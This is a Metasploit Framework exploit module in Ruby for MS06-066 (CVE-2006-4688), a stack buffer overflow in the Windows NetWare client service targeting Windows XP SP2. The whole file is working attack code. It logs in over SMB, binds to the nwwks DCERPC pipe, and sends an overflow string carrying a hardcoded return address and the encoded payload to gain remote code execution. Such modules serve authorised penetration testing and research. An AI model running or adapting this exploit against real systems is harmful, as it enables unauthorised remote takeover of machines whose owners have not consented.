##
# $Id: ms06_066_nwwks.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Services MS06-066 nwwks.dll',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the svchost service, when the netware
				client service is running. This specific vulnerability is in the nwapi32.dll module.
			},
			'Author'         => [ 'pusscat' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-4688'],
					[ 'OSVDB', '30260'],
					[ 'BID', '21023'],
					[ 'MSB', 'MS06-066'],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "",
					'Compat'   =>
					{
						# -ws2ord XXX?
					},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP2',
						{
							'Ret'      => 0x616566fb, # modemui.dll   [esp + 16]: popaw, ret
						},
					]
				],

			'DefaultTarget' => 0,
			'DisclosureDate' => 'Nov 14 2006'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'nwwks']),
			], self.class)

	end

	def exploit
		# [in] [unique] wchar *
		# [in] [unique] wchar *
		# [out] long

		ofstring    = Rex::Text.to_unicode('\\\\') + rand_text(292) + [ target.ret ].pack('V') + "\x00\x00"
		stubdata =
			NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + "\x00") +
			NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingStringPreBuilt(payload.encoded + "\x00\x00") +
			NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + "\x00") +
			NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + "\x00") +
				NDR.UnicodeConformantVaryingStringPreBuilt(ofstring)

		print_status("Connecting to the SMB service...")
		connect()
		smb_login()

		handle = dcerpc_handle('e67ab081-9844-3521-9d32-834f038001c0', '1.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x01, stubdata)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			print_status('Server did not respond, this is expected')
		rescue => e
			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
				print_status('Server disconnected, this is expected')
			else
				raise e
			end
		else
			print_status("Got #{dcerpc.last_response.stub_data.length} bytes: #{dcerpc.last_response.stub_data}")
		end

		# Cleanup
		handler
		disconnect

		if (dcerpc.last_response != nil and
			dcerpc.last_response.stub_data != nil and
			dcerpc.last_response.stub_data == "\x04\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00")
			return true
		else
			return false
		end
	end

end
